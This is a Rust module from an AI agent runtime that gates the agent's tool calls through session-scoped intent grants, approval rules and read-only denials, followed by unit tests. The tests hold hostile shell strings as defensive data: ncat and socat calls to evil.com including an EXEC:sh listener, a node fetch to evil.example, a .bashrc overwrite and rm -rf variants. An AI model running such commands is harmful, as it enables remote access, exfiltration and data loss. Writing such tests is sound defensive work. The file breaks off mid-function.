//! Session-scoped, non-durable intent grants (ADR-55 §4).
//!
//! # Deprecated as control flow
//!
//! Intent routing is no longer consulted as control flow: every run enters one
//! unified loop with full local agency (the orchestrator authority bypasses the
//! intent restrictions while deny-class rules run first), and the coordinator
//! owns run-shape triage. The routing-derived auto-grant helpers were removed;
//! the run-scoped grant store and authorization seam are retained for the
//! paths that still carry a confirmed Execute ([`grant_execute`]).
//!
//! Grants are created fresh per `run_shared_agent` call, so they are bound to
//! a single run/session by construction and never persisted (non-durable).

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

use concerto_core::intent::{RequestedOutcome, RouterRoute};
use concerto_core::types::PolicyAction;
use concerto_core::{
    classify_tier, is_project_bounded_shell, IntentAuthorization, IntentTier, IntentVerdict,
    RULE_INTENT_AUTHORIZED_DELEGATION, RULE_INTENT_AUTHORIZED_SHELL,
};

/// One granted tool-class scope, bound to the confirmed requested outcome.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GrantEntry {
    /// The confirmed requested outcome that produced this grant.
    pub intent: RequestedOutcome,
    /// The tool class covered (`"filesystem"` | `"git"`). Shell is never
    /// grantable (ADR-55 §2 shell scope hole), and Consequential actions are
    /// decided before the grant is ever consulted.
    pub scope: &'static str,
}

/// Run-scoped grant store.
///
/// Created fresh per run: grants are per-plan, session-scoped, non-durable,
/// and revoked by `Stop` / a changed objective (ADR-55 §4) — all of which is
/// achieved structurally here because the store is dropped when the run ends
/// and never persisted.
#[derive(Debug, Default)]
pub struct IntentGrantStore {
    grants: Mutex<Vec<GrantEntry>>,
}

impl IntentGrantStore {
    /// Create an empty, run-scoped store. Grants enter only via [`Self::grant`].
    pub fn new() -> Self {
        Self::default()
    }

    /// Record a grant covering `scope` for the confirmed `intent`.
    ///
    /// Callers are the run loop, after either a high-confidence route
    /// (auto-grant, ADR-55 Phase 2d §1) or an explicit user decision in the
    /// AskUser modal (the classifier-off chain, ADR-56 §3) — never from
    /// routing or classification alone below the threshold.
    pub fn grant(&self, intent: RequestedOutcome, scope: &'static str) {
        self.grants.lock().unwrap_or_else(|e| e.into_inner()).push(GrantEntry { intent, scope });
    }

    /// True while an active grant covers `scope`.
    pub fn covers(&self, scope: &str) -> bool {
        self.grants
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .iter()
            .any(|grant| grant.scope == scope)
    }

    /// True when no grant is active.
    pub fn is_empty(&self) -> bool {
        self.grants.lock().unwrap_or_else(|e| e.into_inner()).is_empty()
    }

    /// Revoke every grant (semantics of `Stop` / changed objective). The store
    /// is dropped at run end anyway; this makes the revocation explicit.
    pub fn revoke_all(&self) {
        self.grants.lock().unwrap_or_else(|e| e.into_inner()).clear();
    }
}

/// Authorization state source for one run (ADR-55 §2/§4).
///
/// `is_read_only_intent` starts `true`: a run stays read-only until routing
/// auto-grants (ADR-55 Phase 2d §1) or the user confirms a mutating intent
/// through the AskUser modal (the classifier-off chain). Only the run loop
/// changes it.
pub struct SessionIntentAuth {
    store: Arc<IntentGrantStore>,
    read_only: AtomicBool,
}

impl SessionIntentAuth {
    /// Wrap a run-scoped store. The run starts read-only until confirmed.
    pub fn new(store: Arc<IntentGrantStore>) -> Self {
        Self { store, read_only: AtomicBool::new(true) }
    }

    /// Set whether the current run is a read-only-intent run. Called once per
    /// run from the routing step, before any tool executes.
    pub fn set_read_only(&self, read_only: bool) {
        self.read_only.store(read_only, Ordering::Relaxed);
    }

    /// Current read-only-intent flag of this run.
    pub fn is_read_only(&self) -> bool {
        self.read_only.load(Ordering::Relaxed)
    }

    /// The run-scoped store this provider consults.
    pub fn store(&self) -> Arc<IntentGrantStore> {
        self.store.clone()
    }
}

impl IntentAuthorization for SessionIntentAuth {
    fn is_read_only_intent(&self) -> bool {
        self.is_read_only()
    }

    fn grant_covers(&self, action: &PolicyAction<'_>) -> bool {
        self.store.covers(action.tool_name)
    }

    /// ADR-55 shell scope amendment (2026-09-09, Fix 2): layer the scoped
    /// shell project-bounded auto-approval on top of the default gate arms.
    ///
    /// Under an **Acting** grant (the same auto-grant a filesystem write is
    /// approved by today — read-only intent absent and the acting auto-grant
    /// covers `filesystem`), a `shell` call is upgraded to
    /// [`IntentVerdict::Allow`] (`rule = "intent_authorized_shell"`, F4 —
    /// a DISTINCT audited row so shell auto-approvals are individually
    /// auditable; filesystem writes keep `intent_authorized`) exactly when
    /// [`is_project_bounded_shell`] proves it stayed inside the project
    /// root: facts carried, `FilesystemScope::ProjectOnly`, no network,
    /// no escape in the command text / `cd` / redirect targets. Everything
    /// else keeps the default verdict — the `RequireApproval`
    /// (`shell_requires_approval`) approval path, the hard read-only `Deny`,
    /// and every Consequential/denylist classification are untouched.
    ///
    /// ADR-55 delegation scope amendment (2026-09-10): under the same Acting
    /// grant, the Coordinator's `call_specialist` dispatch is likewise
    /// upgraded to [`IntentVerdict::Allow`] (`rule =
    /// "intent_authorized_delegation"` — its own DISTINCT audited row,
    /// separate from files/git and shell) so the decision loop can delegate
    /// without an approval the coordinator loop cannot answer. The upgrade
    /// is deliberate cause-only-no-effect: it authorizes the DISPATCH, never
    /// the specialist's own work — every specialist tool call is still
    /// individually policy+grant-gated, spend/task caps still bound the
    /// fan-out, and the zero-work guard still catches no-op dispatches.
    /// A read-only run denies dispatch (hard read-only `Deny`), and a run
    /// without the acting `filesystem` grant keeps `un_granted`.
    fn verdict(&self, action: &PolicyAction<'_>) -> IntentVerdict {
        if is_orchestration_tool(action.tool_name)
            && !self.is_read_only()
            && self.store.covers("filesystem")
        {
            return IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED_DELEGATION };
        }
        if action.tool_name == "shell"
            && !self.is_read_only()
            && self.store.covers("filesystem")
            && matches!(classify_tier(action), IntentTier::MutateLocal)
            && is_project_bounded_shell(action)
        {
            return IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED_SHELL };
        }
        self.default_gate_verdict(action)
    }
}

/// True when `tool_name` is one of the Coordinator's policy-evaluated
/// orchestration/delegation tools (ADR-55 delegation scope amendment, 2026-09-10).
///
/// Audit (2026-09-10, branch `fix/coordinator-delegation-grant`): the
/// Coordinator's decision loop offers exactly three tool families —
/// [`crate::coordinator::CALL_SPECIALIST_TOOL`] (the ONLY one it
/// policy-evaluates itself, in `handle_call_specialist`), the advisory
/// `draft_plan` (handled internally by the planner; it never builds a
/// `PolicyAction` so no gate is ever consulted), and the shared executor's own
/// tools (fs/git/shell — already covered by the `filesystem`/`git` grants and
/// the project-bounded `shell` upgrade through the executor's full policy
/// path). So delegation of specialist dispatch is the only orchestration
/// surface in the grant gap today.
fn is_orchestration_tool(tool_name: &str) -> bool {
    tool_name == crate::coordinator::CALL_SPECIALIST_TOOL
}

/// The audit `rule_matched` value for a routing path (ADR-55 §5.2).
///
/// `RuleHit` carries the deterministic corpus name (`execute_keyword`, ...);
/// the classifier and the ask path use stable synthetic names.
pub fn router_route_name(route: &RouterRoute) -> &'static str {
    match route {
        RouterRoute::RuleHit { rule } => rule,
        RouterRoute::LlmClassifier => "llm_classifier",
        RouterRoute::AskUser => "ask_user",
        _ => "unknown",
    }
}

/// The routing **path kind** for audit envelopes (ADR-55 Phase 2d §5/A2):
/// the [`RouterRoute`] variant name, distinguishing a deterministic corpus
/// hit from the LLM classifier path (`RuleHit` | `LlmClassifier`).
pub fn router_path_name(route: &RouterRoute) -> &'static str {
    match route {
        RouterRoute::RuleHit { .. } => "RuleHit",
        RouterRoute::LlmClassifier => "LlmClassifier",
        RouterRoute::AskUser => "AskUser",
        _ => "Unknown",
    }
}

/// The audit `user_response` value for a requested outcome (ADR-55 §5.2).
pub fn outcome_name(outcome: RequestedOutcome) -> &'static str {
    match outcome {
        RequestedOutcome::Answer => "Answer",
        RequestedOutcome::Diagnose => "Diagnose",
        RequestedOutcome::Review => "Review",
        RequestedOutcome::Plan => "Plan",
        RequestedOutcome::Execute => "Execute",
        RequestedOutcome::Verify => "Verify",
        _ => "Unknown",
    }
}

/// Grant the two in-scope, mutate-local tool classes for a **confirmed**
/// Execute: filesystem local mutations and git local mutations (ADR-55 §2).
///
/// Shared by the paths that carry a confirmed Execute decision: an `Apply`
/// decision on a stored plan binding (see
/// `crate::plan_approval::apply_plan_decision`) and a picked `Execute` in the
/// AskUser modal. Mutate-local, in-scope grants never cover shell (never
/// grantable) and never cover Consequential/destructive actions (decided
/// before the grant is consulted), so this helper can never widen them.
pub fn grant_execute(store: &IntentGrantStore) {
    store.grant(RequestedOutcome::Execute, "filesystem");
    store.grant(RequestedOutcome::Execute, "git");
}

/// Grant the two in-scope, mutate-local tool classes for `intent`
/// (ADR-55 Phase 2d §1): the same `filesystem`/`git` scopes a confirmed
/// `Apply` holds, bound to the routed outcome instead of `Execute`.
///
/// Shell stays never-grantable and Consequential actions are decided before
/// the grant is ever consulted (ADR-55 §Decision 2 capability tiers — a grant
/// only upgrades `RequireApproval`, never overrides `Deny`).
pub fn grant_outcome(store: &IntentGrantStore, intent: RequestedOutcome) {
    store.grant(intent, "filesystem");
    store.grant(intent, "git");
}

/// ADR-55 Phase 2e §2: the permission envelope a routed run executes under.
///
/// The router keeps only the safety job: it decides whether the run may act,
/// never which code path runs. Every non-empty run enters the unified agent
/// loop; the envelope is what the loop's prompt and the policy engine key
/// off.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RunEnvelope {
    /// Hard read-only: no grants exist, the policy engine denies every
    /// mutation, and the loop's prompt does not ask the model to act.
    /// Reached by a task-level prohibition (`negation_override`), an
    /// unresolved `AskUser` ambiguity, or a gate denial
    /// (`declined`/`dismissed`).
    ReadOnly,
    /// Acting: the confirmed grants hold exactly as the gate granted them
    /// (`auto_granted`, or a user-granted Execute). Writes stay governed by
    /// the policy engine, never by a branch.
    Acting,
}

impl RunEnvelope {
    /// Derive the envelope from the intent gate's confirmation value
    /// (`auto_granted` | `granted` | `declined` | `dismissed` | `n/a`).
    ///
    /// Legacy/test-only: under full local agency the run envelope is always
    /// [`RunEnvelope::Acting`], so production no longer derives it from a
    /// routed confirmation.
    ///
    /// A `negation_override` route and an unresolved `AskUser` route never
    /// produce a granting confirmation, so they land [`RunEnvelope::ReadOnly`]
    /// here by construction — the hard read-only invariant does not need its
    /// own clause.
    pub fn from_confirmation(confirmation: &str) -> Self {
        if matches!(confirmation, "granted" | "auto_granted") {
            Self::Acting
        } else {
            Self::ReadOnly
        }
    }

    /// True when the run may act within its grants.
    pub fn is_acting(self) -> bool {
        self == Self::Acting
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use concerto_core::ids::Ulid;
    use concerto_core::policy::SimplePolicyEngine;
    use concerto_core::traits::policy::PolicyEngine;
    use concerto_core::types::{CapabilitySet, Condition, PolicyRule};
    use concerto_core::{
        IntentVerdict, RULE_CONSEQUENTIAL, RULE_INTENT_AUTHORIZED, RULE_INTENT_AUTHORIZED_SHELL,
        RULE_INTENT_READONLY_DENY, RULE_OBSERVE, RULE_SHELL_REQUIRES_APPROVAL, RULE_UN_GRANTED,
    };
    use std::path::PathBuf;

    fn action<'a>(tool_name: &'a str, input: &'a serde_json::Value) -> PolicyAction<'a> {
        PolicyAction {
            tool_name,
            input,
            session_id: Ulid::new(),
            correlation_id: Ulid::new(),
            capability_requirements: CapabilitySet::default(),
            sandbox_profile: None,
            estimated_cost_usd: None,
            command_facts: None,
            orchestrator_authority: false,
        }
    }

    #[test]
    fn grant_store_covers_and_revokes() {
        let store = IntentGrantStore::new();
        assert!(store.is_empty());

        store.grant(RequestedOutcome::Execute, "filesystem");
        assert!(store.covers("filesystem"));
        assert!(!store.covers("git"), "a filesystem grant never covers git");
        assert!(!store.is_empty());

        store.revoke_all();
        assert!(store.is_empty());
        assert!(!store.covers("filesystem"), "revoked grants never cover");
    }

    #[test]
    fn session_starts_read_only_and_denies_writes() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = SessionIntentAuth::new(store.clone());

        assert!(auth.is_read_only(), "a run starts read-only by default");
        // `write` is a MutateLocal filesystem op (not in the destructive/consequential set).
        let input = serde_json::json!({"operation": "write", "path": "src/main.rs"});
        let write = action("filesystem", &input);
        assert_eq!(
            auth.verdict(&write),
            IntentVerdict::Deny { rule: RULE_INTENT_READONLY_DENY },
            "a filesystem mutation in a read-only run is a final pre-sink denial"
        );

        // A read still flows (Observe -> Allow) even in a read-only run.
        let read_input = serde_json::json!({"operation": "read", "path": "src/main.rs"});
        let read = action("filesystem", &read_input);
        assert_eq!(auth.verdict(&read), IntentVerdict::Allow { rule: RULE_OBSERVE });
    }

    #[test]
    fn confirmed_execute_grants_fs_and_git_mutations() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = SessionIntentAuth::new(store.clone());
        auth.set_read_only(false);

        // `write` is a MutateLocal filesystem op (not in the destructive/consequential set).
        let input = serde_json::json!({"operation": "write", "path": "src/main.rs"});
        let write = action("filesystem", &input);
        // No grant yet: MutateLocal on a grantable class -> un_granted prompt.
        assert_eq!(auth.verdict(&write), IntentVerdict::RequireApproval { rule: RULE_UN_GRANTED });

        store.grant(RequestedOutcome::Execute, "filesystem");
        assert_eq!(
            auth.verdict(&write),
            IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED },
            "an in-scope grant upgrades RequireApproval -> Allow for filesystem"
        );

        // Git local mutations need their own grant.
        let commit_input = serde_json::json!({"operation": "commit"});
        let commit = action("git", &commit_input);
        assert_eq!(
            auth.verdict(&commit),
            IntentVerdict::RequireApproval { rule: RULE_UN_GRANTED },
            "a filesystem grant never covers git"
        );
        store.grant(RequestedOutcome::Execute, "git");
        assert_eq!(
            auth.verdict(&commit),
            IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED },
            "an in-scope grant upgrades RequireApproval -> Allow for git local mutation"
        );
    }

    #[test]
    fn shell_mutation_is_never_grantable() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = SessionIntentAuth::new(store.clone());
        auth.set_read_only(false);
        store.grant(RequestedOutcome::Execute, "shell");

        let input = serde_json::json!({"cmd": "rm -rf target"});
        let shell = action("shell", &input);
        assert_eq!(
            auth.verdict(&shell),
            IntentVerdict::RequireApproval { rule: RULE_SHELL_REQUIRES_APPROVAL },
            "shell mutations stay under approval even with a (never-created) shell grant"
        );
    }

    #[test]
    fn consequential_actions_are_never_covered_by_grants() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = SessionIntentAuth::new(store.clone());
        auth.set_read_only(false);
        store.grant(RequestedOutcome::Execute, "git");

        let push_input = serde_json::json!({"operation": "push"});
        let push = action("git", &push_input);
        assert_eq!(
            auth.verdict(&push),
            IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
            "blanket grants never cover Consequential egress"
        );

        let delete_input = serde_json::json!({"operation": "delete", "path": "src/main.rs"});
        let delete = action("filesystem", &delete_input);
        assert_eq!(
            auth.verdict(&delete),
            IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
            "destructive filesystem ops are Consequential and never auto-covered"
        );
    }

    #[test]
    fn audit_name_mappings_are_stable() {
        assert_eq!(router_route_name(&RouterRoute::AskUser), "ask_user");
        assert_eq!(router_route_name(&RouterRoute::LlmClassifier), "llm_classifier");
        assert_eq!(
            router_route_name(&RouterRoute::RuleHit { rule: "execute_keyword" }),
            "execute_keyword"
        );
        assert_eq!(router_path_name(&RouterRoute::AskUser), "AskUser");
        assert_eq!(router_path_name(&RouterRoute::LlmClassifier), "LlmClassifier");
        assert_eq!(router_path_name(&RouterRoute::RuleHit { rule: "execute_keyword" }), "RuleHit");
        assert_eq!(outcome_name(RequestedOutcome::Execute), "Execute");
        assert_eq!(outcome_name(RequestedOutcome::Plan), "Plan");
        assert_eq!(outcome_name(RequestedOutcome::Verify), "Verify");
    }

    // ------------------------------------------------------------------
    // ADR-55 shell scope amendment: scoped project-bounded shell upgrade
    // ------------------------------------------------------------------

    use concerto_core::types::{CommandPolicyFacts, DestructiveClass, FilesystemScope};

    /// Shell facts as the tool derives them for a command whose working
    /// directory resolved inside the session project root.
    fn scoped_facts() -> CommandPolicyFacts {
        CommandPolicyFacts {
            shell_profile_id: None,
            resolved_executable: Some(PathBuf::from("/usr/bin/bash")),
            argv: vec!["/bin/bash".to_owned(), "-c".to_owned(), "cargo build".to_owned()],
            working_directory: Some(PathBuf::from("/proj")),
            network_requested: false,
            filesystem_scope: FilesystemScope::ProjectOnly,
            destructive_classification: DestructiveClass::NonDestructive,
        }
    }

    fn facts_action<'a>(
        input: &'a serde_json::Value,
        facts: CommandPolicyFacts,
    ) -> PolicyAction<'a> {
        PolicyAction {
            tool_name: "shell",
            input,
            session_id: Ulid::new(),
            correlation_id: Ulid::new(),
            capability_requirements: CapabilitySet::default(),
            sandbox_profile: None,
            estimated_cost_usd: None,
            command_facts: Some(facts),
            orchestrator_authority: false,
        }
    }

    fn acting_auth() -> (Arc<IntentGrantStore>, SessionIntentAuth) {
        let store = Arc::new(IntentGrantStore::new());
        let auth = SessionIntentAuth::new(store.clone());
        auth.set_read_only(false);
        grant_outcome(&store, RequestedOutcome::Execute);
        (store, auth)
    }

    /// An in-project `cargo build`-class command is auto-approved under an
    /// Acting auto-grant with its own DISTINCT audited row (F4, security
    /// review 2026-09-09): `Allow {..., intent_authorized_shell}` — shell
    /// auto-approvals are individually auditable; filesystem writes keep
    /// `intent_authorized`.
    #[test]
    fn acting_grant_allows_project_bounded_shell() {
        let (_store, auth) = acting_auth();
        let input = serde_json::json!({"command": "cargo", "args": ["build"]});
        let cargo_build = facts_action(&input, scoped_facts());
        assert_eq!(
            auth.verdict(&cargo_build),
            IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED_SHELL },
            "an in-project shell command under an acting auto-grant carries its own audited rule"
        );
    }

    /// A read-only run hard-denies the same command — never upgraded, never
    /// surfaced to the approval sink (B-1).
    #[test]
    fn read_only_intent_still_hard_denies_shell() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = SessionIntentAuth::new(store.clone());
        let input = serde_json::json!({"command": "cargo", "args": ["build"]});
        let cargo_build = facts_action(&input, scoped_facts());
        assert_eq!(
            auth.verdict(&cargo_build),
            IntentVerdict::Deny { rule: RULE_INTENT_READONLY_DENY }
        );
    }

    /// No acting grant (store empty, mutation-capable run): unchanged
    /// `shell_requires_approval` approval path.
    #[test]
    fn no_grant_keeps_shell_approval() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = SessionIntentAuth::new(store.clone());
        auth.set_read_only(false);
        let input = serde_json::json!({"command": "cargo", "args": ["build"]});
        let cargo_build = facts_action(&input, scoped_facts());
        assert_eq!(
            auth.verdict(&cargo_build),
            IntentVerdict::RequireApproval { rule: RULE_SHELL_REQUIRES_APPROVAL }
        );
    }

    /// A `../` escape, an absolute outside-root path, and an outside-root
    /// working directory keep the existing approval behavior.
    #[test]
    fn shell_escapes_and_outside_root_never_upgrade() {
        let (_store, auth) = acting_auth();

        for (command, verdict) in [
            ("cargo build ../other", RULE_SHELL_REQUIRES_APPROVAL),
            ("echo x > ../out", RULE_CONSEQUENTIAL),
        ] {
            let mut parts = command.split(' ');
            let input = serde_json::json!(
                {"command": parts.next(), "args": parts.collect::<Vec<&str>>()}
            );
            let escaped = facts_action(&input, scoped_facts());
            assert_eq!(
                auth.verdict(&escaped),
                IntentVerdict::RequireApproval { rule: verdict },
                "escape keeps the non-upgrade verdict: {command}"
            );
        }

        // Outside-root READ verbs stay Observe with their existing
        // diagnostic allowance — the upgrade predicate never changes them.
        let input = serde_json::json!({"command": "cat", "args": ["/etc/os-release"]});
        let outside_read = facts_action(&input, scoped_facts());
        assert_eq!(auth.verdict(&outside_read), IntentVerdict::Allow { rule: RULE_OBSERVE });

        let outside_cwd =
            CommandPolicyFacts { filesystem_scope: FilesystemScope::Anywhere, ..scoped_facts() };
        let input = serde_json::json!({"command": "cargo", "args": ["build"]});
        let outside = facts_action(&input, outside_cwd);
        assert_eq!(
            auth.verdict(&outside),
            IntentVerdict::RequireApproval { rule: RULE_SHELL_REQUIRES_APPROVAL },
            "an outside-root working directory keeps approval"
        );
    }

    /// Denylisted/destructive shapes stay Consequential (`RequireApproval
    /// { consequential }`) even when the command is otherwise in-project.
    #[test]
    fn denylisted_shapes_stay_consequential() {
        let (_store, auth) = acting_auth();
        let input = serde_json::json!({"command": "rm", "args": ["-rf", "target"]});
        let rm_rf = facts_action(&input, scoped_facts());
        assert_eq!(
            auth.verdict(&rm_rf),
            IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL }
        );
    }

    // ------------------------------------------------------------------
    // Security-review hardening (2026-09-09): F1/F2/F3 upgrade gates
    // ------------------------------------------------------------------

    /// A shell command string split into the `command`/`args` input shape the
    /// tool validates, so tests can write natural command lines. The caller
    /// binds the returned value to a local and wraps it with
    /// [`facts_action`] so the action borrows a live input.
    fn cmd_input(command: &str) -> serde_json::Value {
        let mut parts = command.split_whitespace();
        serde_json::json!(
            {"command": parts.next().unwrap_or_default(), "args": parts.collect::<Vec<&str>>()}
        )
    }

    /// F1 (env indirection, security review 2026-09-09): ANY `$`, backtick,
    /// `%`, or quote in any token means the scanned text is not the executed
    /// text — env expansion must never reach auto-approval. Bare `cd` goes
    /// to `$HOME` in bash; `cd -` enters an unknown previous directory; a
    /// `cd` target that is not provably in-project keeps approval. All of
    /// these keep the pre-amendment verdicts — RequireApproval/Deny as
    /// before, never Allow.
    #[test]
    fn f1_env_indirection_and_unbounded_cd_never_upgrade() {
        let (_store, auth) = acting_auth();
        let home_redirect = cmd_input("echo pwned > $HOME/.bashrc");
        let home_redirect = facts_action(&home_redirect, scoped_facts());
        assert_eq!(
            auth.verdict(&home_redirect),
            IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
            "$HOME redirect is an escaping write target AND an interpolation token"
        );

        let rm_combo = cmd_input("cd $HOME && rm -rf Documents");
        let rm_combo = facts_action(&rm_combo, scoped_facts());
        assert_eq!(
            auth.verdict(&rm_combo),
            IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
            "interpolated `cd` plus a destructive verb stays Consequential"
        );

        let interpolation = cmd_input("touch $(echo $HOME)/pwned");
        let interpolation = facts_action(&interpolation, scoped_facts());
        assert_eq!(
            auth.verdict(&interpolation),
            IntentVerdict::RequireApproval { rule: RULE_SHELL_REQUIRES_APPROVAL },
            "command substitution is never auto-approved"
        );

        let windows_env = cmd_input("cd %USERPROFILE%");
        let windows_env = facts_action(&windows_env, scoped_facts());
        assert_eq!(
            auth.verdict(&windows_env),
            IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
            "a `%`-indirected `cd` target is an unresolvable escape — Consequential"
        );

        let bare_cd = cmd_input("cd");
        let bare_cd = facts_action(&bare_cd, scoped_facts());
        assert_eq!(
            auth.verdict(&bare_cd),
            IntentVerdict::RequireApproval { rule: RULE_SHELL_REQUIRES_APPROVAL },
            "bare `cd` goes to $HOME in bash — outside the root"
        );

        let dash_cd = cmd_input("cd -");
        let dash_cd = facts_action(&dash_cd, scoped_facts());
        assert_eq!(
            auth.verdict(&dash_cd),
            IntentVerdict::RequireApproval { rule: RULE_SHELL_REQUIRES_APPROVAL },
            "`cd -` re-enters an unknown previous directory — never auto-approved"
        );
    }

    /// F2 (verb hiding, security review 2026-09-09): EVERY token and every
    /// `;`/`&&`/`||`/`|` segment is scanned — not just the first verb — so a
    /// hidden destructive verb anywhere keeps the command under approval.
    #[test]
    fn f2_hidden_verbs_never_upgrade() {
        let (_store, auth) = acting_auth();
        // `cargo build && rm -rf src` (2026-09-11): with the verb-position-
        // independent Consequential scan, the hidden `rm` segment is now
        // classified Consequential → `require: consequential`, not rule-keyed
        // `shell_requires_approval`. Same verdict shape (RequireApproval,
        // never upgraded to Allow, never grantable) — the pin's original
        // expected rule encoded the first-verb-only classification this sweep
        // fixed, so the rule identifier follows the stricter classifier.
        for (command, expected_rule) in [
            ("cargo build && rm -rf src", RULE_CONSEQUENTIAL),
            ("sudo rm f", RULE_SHELL_REQUIRES_APPROVAL),
            ("timeout 5 rm f", RULE_SHELL_REQUIRES_APPROVAL),
            ("find . -delete", RULE_SHELL_REQUIRES_APPROVAL),
            ("xargs rm", RULE_SHELL_REQUIRES_APPROVAL),
            ("env rm", RULE_SHELL_REQUIRES_APPROVAL),
            ("get-data.txt | xargs rm", RULE_SHELL_REQUIRES_APPROVAL),
        ] {
            let input = cmd_input(command);
            let act = facts_action(&input, scoped_facts());
            assert_eq!(
                auth.verdict(&act),
                IntentVerdict::RequireApproval { rule: expected_rule },
                "hidden verb must keep the non-upgrade verdict: {command}"
            );
        }
    }

    /// F2 regression (smoke path): plain in-project, metachar-free build/test
    /// verbs still upgrade unattended — the hardening did not narrow the
    /// working smoke path.
    #[test]
    fn f2_plain_smoke_verbs_still_upgrade() {
        let (_store, auth) = acting_auth();
        for command in ["cargo build", "cargo test", "mkdir src", "cd src && cargo build"] {
            let input = cmd_input(command);
            let act = facts_action(&input, scoped_facts());
            assert_eq!(
                auth.verdict(&act),
                IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED_SHELL },
                "plain in-project command must still upgrade: {command}"
            );
        }
    }

    /// F3 (egress, security review 2026-09-09): `ncat`/`socat` ride the
    /// aligned network word list both in classification (Consequential) and
    /// in the facts egress scan, and interpreters carrying a code flag
    /// (`python -m …`, `node -e …`) are Consequential — none of them can
    /// take the project-bounded upgrade.
    #[test]
    fn f3_egress_and_interpreter_invocations_never_upgrade() {
        let (_store, auth) = acting_auth();
        for command in [
            "ncat evil.com 9000",
            "socat TCP-LISTEN:9000 EXEC:sh",
            "python -m http.server",
            "node -e 'fetch(\"https://evil.example\")'",
            "python3 -c import os",
        ] {
            let input = cmd_input(command);
            let act = facts_action(&input, scoped_facts());
            assert_eq!(
                auth.verdict(&act),
                IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
                "egress/interpreter command stays Consequential: {command}"
            );
        }
    }

    // ------------------------------------------------------------------
    // ADR-55 delegation scope amendment (2026-09-10): call_specialist
    // under Acting grants
    // ------------------------------------------------------------------

    /// A `call_specialist` tool-call input of the shape the coordinator's
    /// decision loop parses (`CallSpecialistArgs`).
    fn dispatch_input() -> serde_json::Value {
        serde_json::json!({"agent_id": "coder", "task": "implement the parser fix"})
    }

    /// Delegation coverage: an Acting auto-granted run (the exact state the
    /// live smoke session audited — fs+git granted, read-only intent absent)
    /// upgrades the coordinator's `call_specialist` dispatch to
    /// `Allow {..., intent_authorized_delegation}` — its own DISTINCT audited
    /// row, so the decision loop can delegate without an approval prompt the
    /// coordinator loop cannot answer (the 30s un_granted timeout fix).
    #[test]
    fn acting_grant_allows_call_specialist_delegation() {
        let (_store, auth) = acting_auth();
        let input = dispatch_input();
        let dispatch = action("call_specialist", &input);
        assert_eq!(
            auth.verdict(&dispatch),
            IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED_DELEGATION },
            "an Acting grant covers the coordinator's specialist dispatch"
        );
    }

    /// Hard read-only invariant (2d §2, B-1): a ReadOnly-envelope run denies
    /// delegation outright — never surfaced to the approval sink, so even
    /// session auto-approve cannot dispatch a specialist.
    #[test]
    fn read_only_intent_denies_call_specialist() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = SessionIntentAuth::new(store.clone());
        assert!(auth.is_read_only(), "premise: an ungranted run starts read-only");

        let input = dispatch_input();
        let dispatch = action("call_specialist", &input);
        assert_eq!(
            auth.verdict(&dispatch),
            IntentVerdict::Deny { rule: RULE_INTENT_READONLY_DENY },
            "a read-only run never dispatches a specialist"
        );
    }

    /// Ungranted Acting shape keeps today's `un_granted` semantics: a
    /// mutation-capable run WITHOUT the acting `filesystem` grant (no grants
    /// in the store) does not blanket-allow delegation — the dispatch keeps
    /// `RequireApproval { un_granted }`, exactly the pre-amendment verdict.
    #[test]
    fn acting_without_grants_keeps_call_specialist_un_granted() {
        let store = Arc::new(IntentGrantStore::new());
        let auth = SessionIntentAuth::new(store.clone());
        auth.set_read_only(false); // acting shape, but zero grants
        assert!(store.is_empty(), "premise: ungranted");

        let input = dispatch_input();
        let dispatch = action("call_specialist", &input);
        assert_eq!(
            auth.verdict(&dispatch),
            IntentVerdict::RequireApproval { rule: RULE_UN_GRANTED },
            "delegation coverage rides the acting GRANT, not just the acting flag"
        );
    }

    /// The upgrade is scoped to the orchestration tool: an un-granted,
    /// non-orchestration MutateLocal tool (e.g. an `mcp:*` namespaced call)
    /// in the same Acting run keeps `RequireApproval { un_granted }` — the
    /// delegation amendment NEVER blanket-allows unknown tools.
    #[test]
    fn non_orchestration_ungranted_tools_keep_un_granted_under_acting() {
        let (_store, auth) = acting_auth();
        let mcp_input = serde_json::json!({});
        let mcp_tool = action("mcp:server:tool", &mcp_input);
        assert_eq!(
            auth.verdict(&mcp_tool),
            IntentVerdict::RequireApproval { rule: RULE_UN_GRANTED },
            "an mcp:* call stays under approval — no delegation-class blanket"
        );
    }

    /// Delegation is never classified Observe/Consequential: the dispatched
    /// specialist runs to completion under the coordinator's engine, and the
    /// upgrade never touches the read-only flag or the tiers.
    #[test]
    fn call_specialist_rides_mutate_local_tier() {
        let input = dispatch_input();
        let dispatch = action("call_specialist", &input);
        assert_eq!(classify_tier(&dispatch), IntentTier::MutateLocal);
    }

    // ------------------------------------------------------------------
    // orchestrator-authority branch through the real engine (additive)
    // ------------------------------------------------------------------

    /// The engine wired with the run's `SessionIntentAuth`, exactly as the
    /// runtime builds it (bare gate + general approval + intent auth).
    fn engine_with_session_auth(auth: Arc<SessionIntentAuth>) -> SimplePolicyEngine {
        SimplePolicyEngine::new(
            vec![
                PolicyRule::RequireApproval(Condition::IntentAuthorized),
                PolicyRule::RequireApproval(Condition::ToolName("call_specialist".into())),
                PolicyRule::RequireApproval(Condition::Always),
            ],
